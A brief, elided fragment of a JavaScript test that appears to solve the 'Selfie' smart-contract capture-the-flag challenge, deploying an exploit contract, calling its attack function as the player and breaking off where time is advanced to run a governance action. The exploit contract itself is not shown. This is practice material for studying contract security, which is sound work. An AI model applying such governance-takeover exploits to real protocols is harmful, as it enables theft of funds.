...
describe("[Challenge] Selfie", function () {
  ...
  it("Execution", async function () {
    ...
    const exploiterFactory = await ethers.getContractFactory("ExploiterSelfie");
    ...
    const actionId = await exploiter.connect(player).callStatic.attack();
    await exploiter.connect(player).attack();

    // Advance time 2 days so we can execute governance action
